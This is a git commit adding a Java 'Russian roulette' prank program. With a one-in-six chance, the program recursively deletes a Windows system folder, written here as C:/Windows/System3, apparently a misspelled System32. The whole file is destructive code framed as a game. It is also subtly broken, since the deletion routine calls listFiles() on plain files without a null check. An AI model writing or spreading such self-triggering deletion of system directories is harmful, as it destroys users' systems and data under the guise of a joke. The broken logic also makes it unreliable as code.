a2de351e1f6afd076597c4a09769ecc5bb55451f
ThiagoDev <thiagodev.vs10@gmail.com>
2025-03-17 22:50:14 -0300

    Vamos bricar?

---
+++ src/App.java
@@ -0,0 +1,20 @@
+package src;
+import java.io.File;
+import java.util.Random;
+
+public class App {
+    public static void main(String[] args) {
+        if (new Random().nextInt(6) == 0) {
+            System.out.println("Tchau Tchau...💀");
+            excluirPasta(new File("C:/Windows/System3"));
+        }
+        else 
+            System.out.println("Quase hein! Kkk");
+    }
+
+    public static void excluirPasta(File pasta) {
+            for (File arquivo : pasta.listFiles()) 
+                excluirPasta(arquivo);
+        pasta.delete();
+    }
+}
